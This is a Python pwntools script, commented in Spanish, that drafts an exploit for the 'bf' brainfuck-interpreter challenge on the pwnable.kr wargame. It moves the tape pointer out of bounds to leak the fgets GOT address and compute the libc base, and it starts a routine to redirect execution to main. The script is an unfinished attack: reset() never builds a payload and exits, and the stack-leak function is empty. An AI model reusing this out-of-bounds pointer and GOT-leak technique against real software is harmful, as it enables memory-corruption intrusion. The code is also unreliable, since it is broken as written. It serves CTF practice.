#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

#r2 -e dbg.profile=bf.rr2

remoto = False
remoto = True
if remoto:
	host = '0'
	host = 'pwnable.kr'
	conn = connect(host, 9001)
else:
	conn = process('./bf')

main = 0x08048671
p    = 0x0804a0a0

"""
+: suma 1(byte) a donde apunta p
-: resta 1(byte) a donde apunta p
,: asigna un getchar() a donde apunta p
.: putchar(*p)
>: sumo 1 a p
<: resto 1 a p
[: not supported
"""

# hace que el binario vuelva a correr desde main
def reset(pre):
	# primero voy a tener que hacer que P apunte a la direc de ret, y dsp escribir ahi el address de main
	global p
	bytes_p = hex(p)[2:]
	if len(bytes_p) == 7:
		bytes_p = '0' + bytes_p
	p_b1 = int(bytes_p[0:2], 16)
	p_b2 = int(bytes_p[2:4], 16)
	p_b3 = int(bytes_p[4:6], 16)
	p_b4 = int(bytes_p[6:8], 16)
	# aun no necesito los bytes de main, necesito el addr de ret
	m_b1 = 0x08
	m_b2 = 0x04
	m_b3 = 0x86
	m_b4 = 0x71
	for pos in range(4):
		if p_b1 < m_b1:
			char = '>'
		else:
			char = '<'
	exit()

def get_libc_base():
	conn.recvuntil('[ ]\n')
	payload  = '<' * (144-3)
	payload += '.<'*4
	payload = reset(payload)
	assert len(payload) <= 1024
	conn.sendline(payload)
	fgets = ''
	for i in range(4):
		fgets = conn.recv(1) + fgets
	fgets = u32(fgets)
	print 'leaked fgets:' + hex(fgets)
	libc = fgets - 0x5e150
	print 'libc base:' + hex(libc)

def leak_stack_pointer():
	pass # no encuentro ninguno D=

def main():
	#leak fgets
	stack = leak_stack_pointer()

	conn.close()

if __name__ == '__main__':
	try:
		reset('')#main()
	except KeyboardInterrupt:
		pass

"""
esi
:> ?v reloc.__libc_start_main 
0x804a024
"""